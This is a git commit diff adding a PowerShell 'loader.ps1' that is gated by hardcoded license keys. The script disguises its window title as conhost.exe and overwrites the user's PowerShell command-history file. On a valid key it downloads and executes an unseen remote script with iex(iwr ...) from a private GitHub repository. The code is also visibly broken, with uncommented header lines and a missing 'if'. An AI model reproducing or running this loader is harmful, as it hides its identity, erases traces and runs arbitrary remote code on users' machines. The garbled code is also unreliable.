65ab453d1a7ef7d6f0ffb4eede5e93eac9f174cc
lnwmon2-crypto <lnwmon2@gmail.com>
2026-03-28 16:52:47 +0700

    Create loader.ps1

---
+++ loader.ps1
@@ -0,0 +1,37 @@
+$Host.UI.RawUI.WindowTitle = "C:\Windows\System32\conhost.exe"
+Clear-Host
+
+===== เปิด ConsoleHost_history.txt =====
+$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+New-Item -ItemType File -Path $hist -Force | Out-Null
+Start-Process notepad.exe $hist
+
+===== KEY LIST =====
+$keys = @(
+"finalpremium-27BHJ",
+"finalpremium-8K2LM",
+"finalpremium-X91QP",
+"finalpremium-55TGH",
+"finalpremium-AB12Z",
+"finalpremium-9PLK3",
+"finalpremium-QW77E",
+"finalpremium-ZX90N",
+"finalpremium-MN45R",
+"finalpremium-LL22X",
+"Nel",
+"King"
+)
+
+===== รับ key =====
+$key = Read-Host "Enter license key"
+
+ ($keys -contains $key) {
+
+    iex (iwr "https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1")
+
+    Write-Host ""
+    Write-Host "Successfully" -ForegroundColor Green
+}
+else {
+    Write-Host "[!] Invalid key." -ForegroundColor Red
+}
